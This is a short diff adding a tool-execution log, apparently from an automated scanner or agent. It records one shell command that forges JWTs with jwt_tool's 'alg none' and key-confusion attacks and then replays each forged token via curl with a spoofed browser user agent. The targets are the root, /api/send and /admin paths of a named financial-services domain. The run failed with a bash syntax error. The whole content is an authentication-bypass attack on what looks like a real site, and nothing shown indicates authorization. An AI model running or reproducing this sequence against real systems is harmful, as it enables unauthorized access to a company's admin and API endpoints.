@@ -1,0 +1,10 @@
+# command: cd /work; UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'; jwt_tool "$(cat jwt_hs256.txt)" -X a 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oE '\[+\] eyJ[A-Za-z0-9_=.-]+' | sed -E 's/\[+\] //' > jt_none.txt; jwt_tool "$(cat jwt_hs256.txt)" -X k -pk pk.pem 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oE '\[+\] eyJ[A-Za-z0-9_=.-]+' | sed -E 's/\[+\] //' > jt_kconf.txt; wc -l jt_none.txt jt_kconf.txt; while read T; do [ -z "$T" ] && continue; echo "--- token: ${T:0:40}..."; for p in "" "api/send" "admin"; do printf "  %-12s " "/$p"; curl -sk --max-time 15 -A "$UA" -H "Authorization: Bearer $T" -o /dev/null -w '%{http_code} size=%{size_download}\n' "https://www.infinitycapital.bh/$p"; done; done < jt_none.txt jt_kconf.txt
+# tool: jwt_tool
+# exit_code: 2
+# ts: 2026-09-30T03:36:34.540967+00:00
+# ---
+
+
+[exit=2]
+bash: -c: line 1: syntax error near unexpected token `jt_kconf.txt'
+bash: -c: line 1: `export WORK_PATH=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e; cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e 2>/dev/null; cd /work; UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36'; jwt_tool "$(cat jwt_hs256.txt)" -X a 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oE '\[+\] eyJ[A-Za-z0-9_=.-]+' | sed -E 's/\[+\] //' > jt_none.txt; jwt_tool "$(cat jwt_hs256.txt)" -X k -pk pk.pem 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oE '\[+\] eyJ[A-Za-z0-9_=.-]+' | sed -E 's/\[+\] //' > jt_kconf.txt; wc -l jt_none.txt jt_kconf.txt; while read T; do [ -z "$T" ] && continue; echo "--- token: ${T:0:40}..."; for p in "" "api/send" "admin"; do printf "  %-12s " "/$p"; curl -sk --max-time 15 -A "$UA" -H "Authorization: Bearer $T" -o /dev/null -w '%{http_code} size=%{size_download}\n' "https://www.infinitycapital.bh/$p"; done; done < jt_none.txt jt_kconf.txt'
